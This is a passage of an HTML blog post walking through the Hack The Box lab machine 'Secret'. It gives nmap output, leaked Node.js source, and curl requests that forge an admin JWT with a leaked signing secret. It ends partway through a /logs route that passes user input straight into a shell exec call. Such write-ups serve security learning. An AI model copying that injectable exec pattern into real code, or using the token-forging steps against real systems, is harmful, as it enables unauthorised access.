<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Secret Hackthebox" /><meta property="og:locale" content="en" /><meta name="description" content="Secret" /><meta property="og:description" content="Secret" /><link rel="canonical" href="https://hazimsyah19.github.io/posts/Secret-Hackthebox/" /><meta property="og:url" content="https://hazimsyah19.github.io/posts/Secret-Hackthebox/" /><meta property="og:site_name" content="~/0xzim" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-26T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Secret Hackthebox" /><meta name="twitter:site" content="@Hazimirwan" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-09-17T15:56:32+08:00","datePublished":"2021-11-26T00:00:00+08:00","description":"Secret","headline":"Secret Hackthebox","mainEntityOfPage":{"@type":"WebPage","@id":"https://hazimsyah19.github.io/posts/Secret-Hackthebox/"},"url":"https://hazimsyah19.github.io/posts/Secret-Hackthebox/"}</script><title>Secret Hackthebox | ~/0xzim</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="~/0xzim"><meta name="application-name" content="~/0xzim"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://pbs.twimg.com/profile_images/1404068620469084162/36SVw1yM_400x400.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">~/0xzim</a></div><div class="site-subtitle font-italic">Cyber security and computer science related stuff</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/hazimsyah19" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Hazimirwan" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/muhammad-hazim-4179941b0/" aria-label="linkedin" > <i class="fab fa-linkedin"></i> </a> <a href="" aria-label="" target="_blank" rel="noopener"> <i class=""></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Secret Hackthebox</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Secret Hackthebox</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1637856000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Nov 26, 2021 </em> </span> <span> Updated <em class="" data-ts="1663401392" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Sep 17, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/hazimsyah19">Muhammad Hazim</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2137 words"> <em>11 min</em> read</span></div></div></div><div class="post-content"><h1 id="secret">Secret</h1><p><img data-src="/assets/img/secret/secret.png" alt="Secret info card" data-proofer-ignore></p><p>Secret is an easy machine on Hackthebox. Started with .git expose and use gittools to extract the repository. Review the source code from the repository and found lot of endpoints. The JSON Web Token will be generate and it help us to manipulate and perform remote code execution then use to get reverse shell. To escalate to root then we need to code review of c program. From that we find that we need to crash the program then it allows us to see the content of the memory via core dump. Then can get the root flag.</p><h2 id="recon"><span class="mr-2"><strong>Recon</strong></span><a href="#recon" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre>PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBjDFc+UtqNVYIrxJx+2Z9ZGi7LtoV6vkWkbALvRXmFzqStfJ3UM7TuOcZcPd82vk0gFVN2/wjA3LUlbUlr7oSlD15DdJkr/XjYrZLJnG4NCxcAnbB5CIRaWmrrdGy5pJ/KgKr4UEVGDK+oAgE7wbv++el2WeD1DF8gw+GIHhtjrK1s0nfyNGcmGOwx8crtHB4xLpopAxWDr2jzMFMdGcIzZMRVLbe+TsG/8O/GFgNXU1WqFYGe4xl+MCmomjh9mUspf1WP2SRZ7V0kndJJxtRBTw6V+NQ/7EJYJPMeugOtbputyZMH+jALhzxBs07JLbw8Bh9JX+ZJl/j6VcIDfFRXxB7ceSe/cp4UYWcLqN+AsoE7k+uMCV6vmXYPNC3g5xfMMrDfVmGmrPbop0oPZUB3kr8iz5CI/qM61WI07/MME1uyM352WZHAJmeBLPAOy05ZBY+DgpVElkr0vVa+3UyKsF1dC3Qm2jisx/qh3sGauv1R8oXGHvy0+oeMOlJN+k<span class="o">=</span>
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOL9rRkuTBwrdKEa+8VrwUjloHdmUdDR87hBOczK1zpwrsV/lXE1L/bYvDMUDVD0jE/aqMhekqNfBimt8aX53O0<span class="o">=</span>
|   256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINM1K8Yufj5FJnBjvDzcr+32BQ9R/2lS/Mu33ExJwsci
80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: DUMB Docs
3000/tcp open  http    syn-ack ttl 63 Node.js <span class="o">(</span>Express middleware<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: DUMB Docs
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>Check the http web and found some download button and it shows that the download button have source code.</p><p><img data-src="/assets/img/secret/Untitled.png" alt="Untitled" data-proofer-ignore></p><p>In the unzip file we can see the .git dir so we can extract it with gitTools. https://github.com/internetwache/GitTools</p><p>The extractor section will extract commits and their content from a broken repository.</p><p><img data-src="/assets/img/secret/Untitled%201.png" alt="Extract the source code from the commits" data-proofer-ignore></p><p>Extract the source code from the commits</p><p><img data-src="/assets/img/secret/Untitled%202.png" alt="Untitled" data-proofer-ignore></p><p>Extract all the commit source code need to do enumeration. We got lot of endpoint and do not know how to exploit. In <code class="language-plaintext highlighter-rouge">forgot.js</code> file we see the a condition to check the name of the user.</p><p><img data-src="/assets/img/secret/Untitled%203.png" alt="Untitled" data-proofer-ignore></p><p><code class="language-plaintext highlighter-rouge">private.js</code> file have have the check role condition where if the user is theadmin we can get the flag??</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="c">#private.js</span>
<span class="k">if</span> <span class="o">(</span>name <span class="o">==</span> <span class="s1">'theadmin'</span><span class="o">){</span>
        res.json<span class="o">({</span>
            role:<span class="o">{</span>

                role:<span class="s2">"you are admin"</span>, 
                desc : <span class="s2">"{flag will be here}"</span>
            <span class="o">}</span>
        <span class="o">})</span>
    <span class="o">}</span>
    <span class="k">else</span><span class="o">{</span>
        res.json<span class="o">({</span>
            role: <span class="o">{</span>
                role: <span class="s2">"you are normal user"</span>,
                desc: userinfo.name.name
            <span class="o">}</span>
        <span class="o">})</span>
    <span class="o">}</span>

<span class="o">})</span>
</pre></table></code></div></div><p>Theres a file which is <code class="language-plaintext highlighter-rouge">verifytoke.js</code> who verify jwt token and the code shows that to pass the verify token we need to have TOKEN_SECRET. Since <code class="language-plaintext highlighter-rouge">.env</code> have the token_secret maybe we can bypass the verification.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="c">#verifytoken.js </span>
const jwt <span class="o">=</span> require<span class="o">(</span><span class="s2">"jsonwebtoken"</span><span class="o">)</span><span class="p">;</span>

module.exports <span class="o">=</span> <span class="k">function</span> <span class="o">(</span>req, res, next<span class="o">)</span> <span class="o">{</span>
    const token <span class="o">=</span> req.header<span class="o">(</span><span class="s2">"auth-token"</span><span class="o">)</span><span class="p">;</span>
    <span class="k">if</span> <span class="o">(!</span>token<span class="o">)</span> <span class="k">return </span>res.status<span class="o">(</span>401<span class="o">)</span>.send<span class="o">(</span><span class="s2">"Access Denied"</span><span class="o">)</span><span class="p">;</span>

    try <span class="o">{</span>
        const verified <span class="o">=</span> jwt.verify<span class="o">(</span>token, process.env.TOKEN_SECRET<span class="o">)</span><span class="p">;</span>
        req.user <span class="o">=</span> verified<span class="p">;</span>
        next<span class="o">()</span><span class="p">;</span>
    <span class="o">}</span> catch <span class="o">(</span>err<span class="o">)</span> <span class="o">{</span>
        res.status<span class="o">(</span>400<span class="o">)</span>.send<span class="o">(</span><span class="s2">"Invalid Token"</span><span class="o">)</span><span class="p">;</span>
    <span class="o">}</span>
<span class="o">}</span><span class="p">;</span>
</pre></table></code></div></div><p>First of all we can see the <code class="language-plaintext highlighter-rouge">/login</code> and <code class="language-plaintext highlighter-rouge">/register</code> so we need to register first then this will generate the jwt token from our credentials.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre><span class="c">#auth.js</span>
router.post<span class="o">(</span><span class="s1">'/register'</span>, async <span class="o">(</span>req, res<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>                                                                       
                                                          
    // validation                                                                                                    
    const <span class="o">{</span> error <span class="o">}</span> <span class="o">=</span> registerValidation<span class="o">(</span>req.body<span class="o">)</span>                                                                   
    <span class="k">if</span> <span class="o">(</span>error<span class="o">)</span> <span class="k">return </span>res.status<span class="o">(</span>400<span class="o">)</span>.send<span class="o">(</span>error.details[0].message<span class="o">)</span><span class="p">;</span>                                                
                                                                                                                     
    // check <span class="k">if </span>user exists                                                                                          
    const emailExist <span class="o">=</span> await User.findOne<span class="o">({</span>email:req.body.email<span class="o">})</span>                                                    
    <span class="k">if</span> <span class="o">(</span>emailExist<span class="o">)</span> <span class="k">return </span>res.status<span class="o">(</span>400<span class="o">)</span>.send<span class="o">(</span><span class="s1">'Email already Exist'</span><span class="o">)</span>
                                                                                                                     
    // check <span class="k">if </span>user name exist                                                                                      
    const unameexist <span class="o">=</span> await User.findOne<span class="o">({</span> name: req.body.name <span class="o">})</span>                                                   
    <span class="k">if</span> <span class="o">(</span>unameexist<span class="o">)</span> <span class="k">return </span>res.status<span class="o">(</span>400<span class="o">)</span>.send<span class="o">(</span><span class="s1">'Name already Exist'</span><span class="o">)</span>
                                                                                                                     
    //hash the password                                                                                              
    const salt <span class="o">=</span> await bcrypt.genSalt<span class="o">(</span>10<span class="o">)</span><span class="p">;</span>                                                                           
    const hashPaswrod <span class="o">=</span> await bcrypt.hash<span class="o">(</span>req.body.password, salt<span class="o">)</span>
                                                                                                                     
                                                                                                                                                                                                                                               //create a user                                                                                                                                                                                                                            const user <span class="o">=</span> new User<span class="o">({</span>  
        name: req.body.name,                              
        email: req.body.email,                                                                                       
        password:hashPaswrod
    <span class="o">})</span><span class="p">;</span>                                                   
                                                          
    try<span class="o">{</span>                                    
        const saveduser <span class="o">=</span> await user.save<span class="o">()</span><span class="p">;</span>
        res.send<span class="o">({</span> user: user.name<span class="o">})</span>
     
    <span class="o">}</span>          
    catch<span class="o">(</span>err<span class="o">){</span>         
        console.log<span class="o">(</span>err<span class="o">)</span>
    <span class="o">}</span>                                                     
                                                          
<span class="o">})</span><span class="p">;</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">/login</code> check all the information if its valid also check the jwt token too.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="c">#auth.js</span>
router.post<span class="o">(</span><span class="s1">'/login'</span>, async  <span class="o">(</span>req , res<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>             
                                                          
    const <span class="o">{</span> error <span class="o">}</span> <span class="o">=</span> loginValidation<span class="o">(</span>req.body<span class="o">)</span>                                                                      
    <span class="k">if</span> <span class="o">(</span>error<span class="o">)</span> <span class="k">return </span>res.status<span class="o">(</span>400<span class="o">)</span>.send<span class="o">(</span>error.details[0].message<span class="o">)</span><span class="p">;</span>

    // check <span class="k">if </span>email is okay 
    const user <span class="o">=</span> await User.findOne<span class="o">({</span> email: req.body.email <span class="o">})</span>
    <span class="k">if</span> <span class="o">(!</span>user<span class="o">)</span> <span class="k">return </span>res.status<span class="o">(</span>400<span class="o">)</span>.send<span class="o">(</span><span class="s1">'Email is wrong'</span><span class="o">)</span><span class="p">;</span>

    // check password 
    const validPass <span class="o">=</span> await bcrypt.compare<span class="o">(</span>req.body.password, user.password<span class="o">)</span>
    <span class="k">if</span> <span class="o">(!</span>validPass<span class="o">)</span> <span class="k">return </span>res.status<span class="o">(</span>400<span class="o">)</span>.send<span class="o">(</span><span class="s1">'Password is wrong'</span><span class="o">)</span><span class="p">;</span>

    // create jwt 
    const token <span class="o">=</span> jwt.sign<span class="o">({</span> _id: user.id, name: user.name , email: user.email<span class="o">}</span>, process.env.TOKEN_SECRET <span class="o">)</span>
    res.header<span class="o">(</span><span class="s1">'auth-token'</span>, token<span class="o">)</span>.send<span class="o">(</span>token<span class="o">)</span><span class="p">;</span>
</pre></table></code></div></div><p>Try curl command and it always return the page of the website. The command is</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="c">#It always return source code of the page.</span>
curl <span class="nt">-X</span> POST http://10.10.11.120/login <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"name":"theadmin","email":"theadmin@dasith.works","password":"admin1234"}'</span>
</pre></table></code></div></div><p>I wonder what is wrong so i check again all the source code file. Found in index.js theres an <code class="language-plaintext highlighter-rouge">api</code> that has been declare and it for all the file in <code class="language-plaintext highlighter-rouge">/routes/auth</code> .</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre>// import routs 
const authRoute <span class="o">=</span> require<span class="o">(</span><span class="s1">'./routes/auth'</span><span class="o">)</span><span class="p">;</span>  <span class="o">&lt;&lt;&lt;</span>
const webroute <span class="o">=</span> require<span class="o">(</span><span class="s1">'./src/routes/web'</span><span class="o">)</span>

dotenv.config<span class="o">()</span><span class="p">;</span>
//connect db 

mongoose.connect<span class="o">(</span>process.env.DB_CONNECT, <span class="o">{</span> useNewUrlParser: <span class="nb">true</span> <span class="o">}</span>, <span class="o">()</span> <span class="o">=&gt;</span>
    console.log<span class="o">(</span><span class="s2">"connect to db!"</span><span class="o">)</span>
<span class="o">)</span><span class="p">;</span>

//middle ware 
app.use<span class="o">(</span>express.json<span class="o">())</span><span class="p">;</span>
app.use<span class="o">(</span><span class="s1">'/api/user'</span>,authRoute<span class="o">)</span>  <span class="o">&lt;&lt;&lt;</span>
app.use<span class="o">(</span><span class="s1">'/api/'</span>, privRoute<span class="o">)</span>
app.use<span class="o">(</span><span class="s1">'/'</span>, webroute<span class="o">)</span>
</pre></table></code></div></div><h2 id="foothold"><span class="mr-2"><strong>Foothold</strong></span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Thats when i realize need to add <code class="language-plaintext highlighter-rouge">/api/user</code> .</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c">#Output of the curl command with the API</span>
curl <span class="nt">-X</span> POST http://10.10.11.120/api/user/register <span class="nt">-H</span> <span class="s1">'Content-Type: application/json'</span> <span class="nt">-d</span> <span class="s1">'{"name":"theadmin","email":"theadmin@dasith.works","password":"admin1234"}'</span>
Name already Exist
</pre></table></code></div></div><p>It shows that it already exist. We need to login as theadmin so we can get the role privilage so in order to bypass the condition I set one space infront of theadmin name. and register it with the curl command.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root@Rav3nCLaW <span class="o">[</span>10:52:19 AM] <span class="o">[</span>~/Documents/htb/secret] 
-&gt; <span class="c"># curl -X POST http://10.10.11.120/api/user/register -H 'Content-Type: application/json' -d '{"name":" theadmin","email":"admin@dasith.works","password":"admin1234"}'                                                                 </span>
<span class="o">{</span><span class="s2">"user"</span>:<span class="s2">" theadmin"</span><span class="o">}</span>
</pre></table></code></div></div><p>Then login into it and we get the jwt token</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root@Rav3nCLaW <span class="o">[</span>10:56:42 AM] <span class="o">[</span>~/Documents/htb/secret] 
-&gt; <span class="c"># curl -X POST http://10.10.11.120/api/user/login -H 'Content-Type: application/json' -d '{"email":"admin@dasith.works","password":"admin1234"}'</span>
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZWZlOGQ3YTU3MTA0NjE1NTUyNWMiLCJuYW1lIjoiIHRoZWFkbWluIiwiZW1haWwiOiJhZG1pbkBkYXNpdGgud29ya3MiLCJpYXQiOjE2Mzk5NjkwMDV9.MRp-w0TwkkQCnaU-FXpb8GuUA-WG-2fuFFTG7fPFB2
</pre></table></code></div></div><p>From the <a href="http://jwt.io">jwt.io</a> we can see that theadmin name have one space and we can get the jwt token.</p><p><img data-src="/assets/img/secret/Untitled%204.png" alt="Payload of the curl command" data-proofer-ignore></p><p>Payload of the curl command</p><p>But as we check for the privilage we do not get <code class="language-plaintext highlighter-rouge">theadmin</code> privilage. I guess because we put space and we do not get that. I erase the space and try it again but it return invalid token.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>root@Rav3nCLaW <span class="o">[</span>11:05:26 AM] <span class="o">[</span>~/Documents/htb/secret] 
-&gt; <span class="c"># curl http://10.10.11.120/api/priv -H 'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZWZlOGQ3YTU3MTA0NjE1NTUyNWMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGRhc2l0aC53b3JrcyIsImlhdCI6MTYzOTk2OTAwNX0.2_lODVTEONZFoluz_xGgc5w90ChYO56_p4pRR9iYDxA'</span>
Invalid Token
</pre></table></code></div></div><p>As for now we can change the payload data and we get the secret token and I put the secret token to verify the signature. Get the new token and try it as before.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>curl http://10.10.11.120/api/priv <span class="nt">-H</span> <span class="s1">'auth-token:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWJmZWZlOGQ3YTU3MTA0NjE1NTUyNWMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImFkbWluQGRhc2l0aC53b3JrcyIsImlhdCI6MTYzOTk2OTAwNX0.J98EPAjVQ7KJwK2i0OC9BQ2CSqav7I3T6Tq0dyZ_YT0'</span>
<span class="o">{</span><span class="s2">"creds"</span>:<span class="o">{</span><span class="s2">"role"</span>:<span class="s2">"admin"</span>,<span class="s2">"username"</span>:<span class="s2">"theadmin"</span>,<span class="s2">"desc"</span>:<span class="s2">"welcome back admin"</span><span class="o">}}</span>
</pre></table></code></div></div><p>Yeayy got it but what to do next ??? As idk what to do i found somethin new in <code class="language-plaintext highlighter-rouge">/2-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b/routes/private.js</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
</pre><td class="rouge-code"><pre>const router <span class="o">=</span> require<span class="o">(</span><span class="s1">'express'</span><span class="o">)</span>.Router<span class="o">()</span><span class="p">;</span>
const verifytoken <span class="o">=</span> require<span class="o">(</span><span class="s1">'./verifytoken'</span><span class="o">)</span>
const User <span class="o">=</span> require<span class="o">(</span><span class="s1">'../model/user'</span><span class="o">)</span><span class="p">;</span>

router.get<span class="o">(</span><span class="s1">'/priv'</span>, verifytoken, <span class="o">(</span>req, res<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>
   // res.send<span class="o">(</span>req.user<span class="o">)</span>

    const userinfo <span class="o">=</span> <span class="o">{</span> name: req.user <span class="o">}</span>

    const name <span class="o">=</span> userinfo.name.name<span class="p">;</span>
    
    <span class="k">if</span> <span class="o">(</span>name <span class="o">==</span> <span class="s1">'theadmin'</span><span class="o">){</span>
        res.json<span class="o">({</span>
            creds:<span class="o">{</span>
                role:<span class="s2">"admin"</span>, 
                username:<span class="s2">"theadmin"</span>,
                desc : <span class="s2">"welcome back admin,"</span>
            <span class="o">}</span>
        <span class="o">})</span>
    <span class="o">}</span>
    <span class="k">else</span><span class="o">{</span>
        res.json<span class="o">({</span>
            role: <span class="o">{</span>
                role: <span class="s2">"you are normal user"</span>,
                desc: userinfo.name.name
            <span class="o">}</span>
        <span class="o">})</span>
    <span class="o">}</span>
<span class="o">})</span>

router.get<span class="o">(</span><span class="s1">'/logs'</span>, verifytoken, <span class="o">(</span>req, res<span class="o">)</span> <span class="o">=&gt;</span> <span class="o">{</span>
    const file <span class="o">=</span> req.query.file<span class="p">;</span>   <span class="o">&lt;&lt;&lt;</span>
    const userinfo <span class="o">=</span> <span class="o">{</span> name: req.user <span class="o">}</span>
    const name <span class="o">=</span> userinfo.name.name<span class="p">;</span>
    
    <span class="k">if</span> <span class="o">(</span>name <span class="o">==</span> <span class="s1">'theadmin'</span><span class="o">){</span>
        const getLogs <span class="o">=</span> <span class="sb">`</span>git log <span class="nt">--oneline</span> <span class="k">${</span><span class="nv">file</span><span class="k">}</span><span class="sb">`</span><span class="p">;</span>
        <span class="nb">exec</span><span class="o">(</span>getLogs, <span class="o">(</span>err , output<span class="o">)</span> <span class="o">=&gt;{</span>
            <span class="k">if</span><span class="o">(</span>err<span class="o">){</span>
                res.status<span class="o">(</span>500<span class="o">)</span>.send<span class="o">(</span>err<span class="o">)</span><span class="p">;</span>
                <span class="k">return</span>
            <span class="o">}</span>
